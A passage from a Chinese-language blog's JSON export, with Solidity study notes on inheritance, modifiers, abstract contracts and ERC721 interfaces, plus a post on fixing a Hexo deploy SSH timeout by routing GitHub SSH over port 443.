Baba) &#123; emit Log(&quot;Erzi&quot;); &#125; 在 Erzi 合约中重写了hip() 和 pop() 两个函数，将输出改为 “Erzi”, 并且还分别从YeYe 和 BaBa 合约中继承了 yeye() 和 baba() 两个函数。 12.4 修饰器的继承这个代码修饰器还可以带参数的呀？？？有点惊讶！我得去前面看看 solidity 中的 修饰器（Modifier）同样可以继承，用法与函数继承类似，在相应的地方加上viretual 和 override 关键字即可。 123456789101112131415161718192021contract Base1 &#123; modifier exactDividedBy2And3(uint _a) virtual &#123; require(_a % 2 == 0 &amp;&amp; _a % 3 == 0); _; &#125;&#125;contract Identifier is Base1 &#123; //计算一个数分别被2除和被3除的值，但是传入的参数必须是2和3的倍数 function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) &#123; return getExactDividedBy2And3WithoutModifier(_dividend); &#125; //计算一个数分别被2除和被3除的值 function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint)&#123; uint div2 = _dividend / 2; uint div3 = _dividend / 3; return (div2, div3); &#125;&#125; Identifier 合约可以直接在代码中使用父合约的 exactDividedBy2And3 修饰器，也可以利用 override 关键字重写修饰器： 1234modifier exactDividedBy2And3(uint _a) override &#123; _; require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);&#125; 12.5 构造函数的继承子合约有两种方法继承父合约的构造函数。例如，父合约A里面有一个状态变量a，并由构造函数的参数来确定： 12345678// 构造函数的继承abstract contract A &#123; uint public a; constructor(uint _a) &#123; a = _a; &#125;&#125; 12.5.1 在继承时声明父构造函数的参数，例如：contract B is A(1) 12.5.2 在子合约的构造函数中声明构造函数的参数，例如： 123contract C is A &#123; constructor(uint _c) A(_c * _c) &#123;&#125;&#125; 12.6 调用父合约的函数子合约有两种方式调用父合约的函数，直接调用和利用super 关键字。 12.6.1 直接调用：子合约可以直接用 父合约名. 函数名() 的方式来调用父合约函数，例如 Yeye.pop()。 123function callParent() public&#123; Yeye.pop();&#125; 12.6.2 super 关键字：子合约可以利用super. 函数名() 来调用最近的父合约函数。solidity 继承关系按声明时从左到右的顺序是：contract Erzi is YeYe，BaBa，那么BaBa 是最近的父合约，super.pop() 将调用BaBa.pop() 而不是 YeYe.pop()。 1234function callParentSuper() public&#123; // 将调用最近的父合约函数，Baba.pop() super.pop();&#125; Solidity_day0313. 抽象合约和接口13.1 抽象合约 如果一个智能合约里至少有一个为实现的函数，即某个函数缺少主体{} 中的内容，则必须将该合约标为 abstract ，不然编译就会报错； 另外，未实现的函数需要加 virtual， 以便子合约重写。直接我们写了 个冒泡排序，如果我们还不知道具体的函数体怎么写 即不知道如何是实现冒泡排序，那么可将函数标为 abstract， 之后让别人补写函数的实现过程。 123abstract contract BubSort &#123; function bubSort(uint[] memory a) public pure virtual returns(uint[] memory);&#125; 13.2 接口 接口类似于抽象合约，但它不实现任何功能。接口的规则： a. 不能包含状态变量 b. 不能包含构造函数 c. 不能继承除接口外的其他合约 d. 所有函数都必须 是external 且不能有函数体 e. 继承接口的合约必须实现接口定义的所有功能 虽然接口不实现任何功能，但它非常重要。接口是智能合约的骨架，定义了合约的功能以及如何触发它们：如果智能合约实现了某种接口（比如ERC20 和 ERC721), 其他Dapps 和智能合约就知道如何与它交互。因为接口提供了两个重要信息： a. 合约里每个函数的 bytes4 选择器，以及基于它们的函数签名 函数名(每个参数类型)。 b. 接口id （暂时还不能理解） 另外，接口和合约 ABI 等价，可以相互转换：编译接口可以得到合约的ABI， 利用 abi-to-sol工具 也可以将 ABI json 文件转换为 接口 sol 文件。 我们用 ERC721 接口合约 IECRC721 为例，它定义了3个 event 和 9 个function， 所有 ERC721 标准的 NFT 都是实现了 这些函数。我们可以看到，接口和常规合约的区别在于每个函数都以 ; 代替了函数体 &#123;&#125; 结尾。 1234567891011121314151617181920212223interface IERC721 is IERC165 &#123; event Transfer(address indexed from, address indexed to, uint256 indexed tokenId); event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId); event ApprovalForAll(address indexed owner, address indexed operator, bool approved); function balanceOf(address owner) external view returns (uint256 balance); function ownerOf(uint256 tokenId) external view returns (address owner); function safeTransferFrom(address from, address to, uint256 tokenId) external; function transferFrom(address from, address to, uint256 tokenId) external; function approve(address to, uint256 tokenId) external; function getApproved(uint256 tokenId) external view returns (address operator); function setApprovalForAll(address operator, bool _approved) external; function isApprovedForAll(address owner, address operator) external view returns (bool); function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data) external;&#125; 13.3 IERC721 事件IERC721 包含3 个事件，其中 Transfer 和 Approval 事件在 ERC20 中也有。 Transfer 事件： 在转账时被释放，记录代币的发出地址 from，接收to 和 tokenId Approval 事件：在授权时释放：记录授权地址 owner， 被授权地址 approved 和 tokenId ApprovalForAll 事件：在批量授权时释放记录批量授权发出的地址 owner， 被授权地址 operator 和授权与否的 approved。 13.4 IERC721函数 balanceOf：返回某个地址的NFT 持有量 balance ownerOf：返回某tokenId 的主人 owner transferFrom：普通转账，参数为转出地址from，接收地址 to 和tokenId safeTransferFrom：安全转账（如果接收方是合约地址，会要求实现ERC71Receiver 接口）。参数为转出 from，接收地址 to 和 tokenId approve：授权另一个地址使用你的NFT。参数为被授权地址approve 和 tokenId getApproved：查询tokenId 被批准给了哪个地址 setApprovalForAll：将自己持有的该系列 NFT批量授权给某个地址 operator isApprovedForAll：查询某地址的 NFT 是否批量授权给了另一个 operator 地址 safeTransferFrom：安全转账的重载函数，参数里卖你包含了 data 13.5 什么时候使用接口如果我们知道一个合约实现了 IERC721接口，我们不需要知道它具体代码实现，就可以与它交互。 无聊猿 BAYC 属于ERC721 代币，实现了接口的功能。我们不需要知道他的源代码，只需知道它的合约地址，用 IERC721 接口就可以与它交互，比如用 balanceOf() 来查询某个地址的 BAYC余额，用 safeTransferFrom() 来转账 BAYC. 1234567891011121314contract interactBAYC &#123; // 利用BAYC地址创建接口合约变量（ETH主网） IERC721 BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D); // 通过接口调用BAYC的balanceOf()查询持仓量 function balanceOfBAYC(address owner) external view returns (uint256 balance)&#123; return BAYC.balanceOf(owner); &#125; // 通过接口调用BAYC的safeTransferFrom()安全转账 function safeTransferFromBAYC(address from, address to, uint256 tokenId) external&#123; BAYC.safeTransferFrom(from, to, tokenId); &#125;&#125; tips: 顿悟—— 因为之前只学过Java所以脑子里都是Java的思维逻辑，一直不能理解solidity中的使用接口来调用方法，问了学长才知道，他和 Java 不一样，可以自己定义一个接口，只要某个函数实现了该接口的方法，就可以直接通过该接口来调用那个函数！！！！ 13.6 代码测试验证猜想","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"}]},{"title":"hexo d命令出问题","slug":"Hexo/hexo d 命令出问题","date":"2022-12-04T10:25:10.000Z","updated":"2022-12-04T10:25:10.000Z","comments":true,"path":"2022/12/04/Hexo/hexo d 命令出问题/","link":"","permalink":"https://biyouqiuqiu.com/2022/12/04/Hexo/hexo%20d%20%E5%91%BD%E4%BB%A4%E5%87%BA%E9%97%AE%E9%A2%98/","excerpt":"","text":"搭建博客的经历没有想象中的那样一帆风顺，最大的问题出现在hexo d 的部署上，每次都是卡在网络连接超时，在_config.xml文件中修改了 repository的值，将https://github.com/LBiyou/LBiyou.github.io.git 换成：&#103;&#x69;&#116;&#64;&#x67;&#105;&#x74;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#x6d;:LBiyou&#x2F;LBiyou.github.io.git 之后，获取公钥然后添加公钥，执行hexo d 就报 remote 什么什么，还有什么exsit之类的。 然后就是 在git 执行 ssh -T &#103;&#x69;&#116;&#x40;&#x67;&#x69;&#116;&#104;&#117;&#x62;&#46;&#99;&#x6f;&#x6d; 这行语句验证是否配置成果，结果报ssh: connect to host github.com port 22: Connection timed out连接超时，然后网上找资料，到 D:\\Git\\Git\\etc\\ssh 下修改ssh_config文件 将 1234567Host ssh.dev.azure.com HostkeyAlgorithms +ssh-rsa PubkeyAcceptedAlgorithms +ssh-rsa# Added by git-extraHost *.visualstudio.com HostkeyAlgorithms +ssh-rsa PubkeyAcceptedAlgorithms +ssh-rsa 配置新的端口号443 1234567Host github.com /* 服务器地址：github.com */User YourEmail /* 用户账号：github上的注册邮箱 */Hostname ssh.github.com /* 服务器地址为github地址*/PreferredAuthentications publickey /* 采用公匙 */IdentityFile ~/.ssh/id_rsa /* 公匙文件路径 */Port 443 /* 端口 */ 参考博客为：[报错： ssh: connect to host github.com port 22: Connection timed out_taotianlucky的博客-CSDN博客](https://blog.csdn.net/qq_31020665/article/details/114113108?ops_request_misc=%7B%22request%5Fid%22%3A%22167030504016800186529240%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=167030504016800186529240&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-8-114113108-null-null.142^v67^control,201^v4^add_ask,213^v2^t3_control2&amp;utm_term=ssh -t git%40github.com超时&amp;spm&#x3D;1018.2226.3001.4187) 在本机的配置文件为： 123456Host github.com User 3071709373@qq.com Hostname ssh.github.com PreferredAuthentications publickey IdentityFile ~/.ssh/id_rsa Port 443 修改之后，运行 ssh -T &#x67;&#105;&#x74;&#x40;&#103;&#x69;&#116;&#x68;&#x75;&#x62;&#46;&#99;&#111;&#109; 成功，执行 hexo g hexo d 都成功","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/tags/Hexo/"},{"name":"心得","slug":"心得","permalink":"https://biyouqiuqiu.com/tags/%E5%BF%83%E5%BE%97/"}]}],"categories":[{"name":"Knowledge literacy","slug":"Knowledge-literacy","permalink":"https://biyouqiuqiu.com/categories/Knowledge-literacy/"},{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"},{"name":"proxy contract","slug":"Knowledge-literacy/proxy-contract","permalink":"https://biyouqiuqiu.com/categories/Knowledge-literacy/proxy-contract/"},{"name":"uniswap","slug":"Knowledge-literacy/uniswap","permalink":"https://biyouqiuqiu.com/categories/Knowledge-literacy/uniswap/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"},{"name":"damn defi","slug":"Knowledge-literacy/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Knowledge-literacy/damn-defi/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"ERC","slug":"Smart-contracts/ERC","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ERC/"},{"name":"Hardhat","slug":"Hardhat","permalink":"https://biyouqiuqiu.com/categories/Hardhat/"},{"name":"Basic_Knowledge","slug":"Hardhat/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Hardhat/Basic-Knowledge/"},{"name":"Python","slug":"Python","permalink":"https://biyouqiuqiu.com/categories/Python/"},{"name":"Basic_Knowledge","slug":"Python/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Python/Basic-Knowledge/"},{"name":"Ethers.js","slug":"Ethers-js","permalink":"https://biyouqiuqiu.com/categories/Ethers-js/"},{"name":"Basic_Knowledge","slug":"Ethers-js/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Ethers-js/Basic-Knowledge/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"},{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/categories/Web3/"},{"name":"Basic_Knowledge","slug":"Web3/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Web3/Basic-Knowledge/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"},{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/categories/Hexo/"}],"tags":[{"name":"Knowledge literacy","slug":"Knowledge-literacy","permalink":"https://biyouqiuqiu.com/tags/Knowledge-literacy/"},{"name":"Timelock","slug":"Timelock","permalink":"https://biyouqiuqiu.com/tags/Timelock/"},{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Upgradeable","slug":"Upgradeable","permalink":"https://biyouqiuqiu.com/tags/Upgradeable/"},{"name":"Proxy","slug":"Proxy","permalink":"https://biyouqiuqiu.com/tags/Proxy/"},{"name":"Transparent","slug":"Transparent","permalink":"https://biyouqiuqiu.com/tags/Transparent/"},{"name":"uniswap v2","slug":"uniswap-v2","permalink":"https://biyouqiuqiu.com/tags/uniswap-v2/"},{"name":"PrivateKey","slug":"PrivateKey","permalink":"https://biyouqiuqiu.com/tags/PrivateKey/"},{"name":"ASCII","slug":"ASCII","permalink":"https://biyouqiuqiu.com/tags/ASCII/"},{"name":"代理合约","slug":"代理合约","permalink":"https://biyouqiuqiu.com/tags/%E4%BB%A3%E7%90%86%E5%90%88%E7%BA%A6/"},{"name":"using","slug":"using","permalink":"https://biyouqiuqiu.com/tags/using/"},{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/tags/Smart-contracts/"},{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC2612","slug":"ERC2612","permalink":"https://biyouqiuqiu.com/tags/ERC2612/"},{"name":"ERC4626","slug":"ERC4626","permalink":"https://biyouqiuqiu.com/tags/ERC4626/"},{"name":"interface","slug":"interface","permalink":"https://biyouqiuqiu.com/tags/interface/"},{"name":"ERC1820","slug":"ERC1820","permalink":"https://biyouqiuqiu.com/tags/ERC1820/"},{"name":"ERC777","slug":"ERC777","permalink":"https://biyouqiuqiu.com/tags/ERC777/"},{"name":"ERC3156","slug":"ERC3156","permalink":"https://biyouqiuqiu.com/tags/ERC3156/"},{"name":"ERC165","slug":"ERC165","permalink":"https://biyouqiuqiu.com/tags/ERC165/"},{"name":"ERC721","slug":"ERC721","permalink":"https://biyouqiuqiu.com/tags/ERC721/"},{"name":"hardhat","slug":"hardhat","permalink":"https://biyouqiuqiu.com/tags/hardhat/"},{"name":"内联汇编","slug":"内联汇编","permalink":"https://biyouqiuqiu.com/tags/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"},{"name":"python","slug":"python","permalink":"https://biyouqiuqiu.com/tags/python/"},{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"},{"name":"encode","slug":"encode","permalink":"https://biyouqiuqiu.com/tags/encode/"},{"name":"encodePacked","slug":"encodePacked","permalink":"https://biyouqiuqiu.com/tags/encodePacked/"},{"name":"验证签名","slug":"验证签名","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ECDSA","slug":"ECDSA","permalink":"https://biyouqiuqiu.com/tags/ECDSA/"},{"name":"ethersjs","slug":"ethersjs","permalink":"https://biyouqiuqiu.com/tags/ethersjs/"},{"name":"ethereumjs","slug":"ethereumjs","permalink":"https://biyouqiuqiu.com/tags/ethereumjs/"},{"name":"abi.encode","slug":"abi-encode","permalink":"https://biyouqiuqiu.com/tags/abi-encode/"},{"name":"abi.encodePacked","slug":"abi-encodePacked","permalink":"https://biyouqiuqiu.com/tags/abi-encodePacked/"},{"name":"solidityKeccak256","slug":"solidityKeccak256","permalink":"https://biyouqiuqiu.com/tags/solidityKeccak256/"},{"name":"abiCoder.encode","slug":"abiCoder-encode","permalink":"https://biyouqiuqiu.com/tags/abiCoder-encode/"},{"name":"hash","slug":"hash","permalink":"https://biyouqiuqiu.com/tags/hash/"},{"name":"ethers.js","slug":"ethers-js","permalink":"https://biyouqiuqiu.com/tags/ethers-js/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"},{"name":"整数溢出","slug":"整数溢出","permalink":"https://biyouqiuqiu.com/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"},{"name":"学习总结","slug":"学习总结","permalink":"https://biyouqiuqiu.com/tags/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"},{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/tags/Web3/"},{"name":"capther总结","slug":"capther总结","permalink":"https://biyouqiuqiu.com/tags/capther%E6%80%BB%E7%BB%93/"},{"name":"Remix-debug","slug":"Remix-debug","permalink":"https://biyouqiuqiu.com/tags/Remix-debug/"},{"name":"ERC20","slug":"ERC20","permalink":"https://biyouqiuqiu.com/tags/ERC20/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"总结","slug":"总结","permalink":"https://biyouqiuqiu.com/tags/%E6%80%BB%E7%BB%93/"},{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/tags/Hexo/"},{"name":"图床","slug":"图床","permalink":"https://biyouqiuqiu.com/tags/%E5%9B%BE%E5%BA%8A/"},{"name":"sm.ms","slug":"sm-ms","permalink":"https://biyouqiuqiu.com/tags/sm-ms/"},{"name":"vika","slug":"vika","permalink":"https://biyouqiuqiu.com/tags/vika/"},{"name":"ecrecover","slug":"ecrecover","permalink":"https://biyouqiuqiu.com/tags/ecrecover/"},{"name":"心得","slug":"心得","permalink":"https://biyouqiuqiu.com/tags/%E5%BF%83%E5%BE%97/"}]}